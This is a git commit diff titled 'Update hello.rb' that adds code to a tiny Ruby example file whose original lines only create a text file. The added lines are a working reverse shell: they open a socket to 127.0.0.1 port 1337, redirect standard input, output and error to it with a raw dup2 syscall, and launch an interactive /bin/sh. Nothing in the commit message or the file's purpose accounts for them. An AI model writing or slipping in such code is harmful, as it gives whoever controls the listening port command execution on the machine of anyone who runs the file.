bbe9d97340a2832f846f13fa9a105a8b3642882b
aman143kri <42419157+aman143kri@users.noreply.github.com>
2024-12-20 10:36:22 -0800

    Update hello.rb

--- hello.rb
+++ hello.rb
@@ -1,3 +1,10 @@
 system("touch hello.txt")
 # or using backticks
 `touch hello.txt`
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 1337, '127.0.0.1'
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
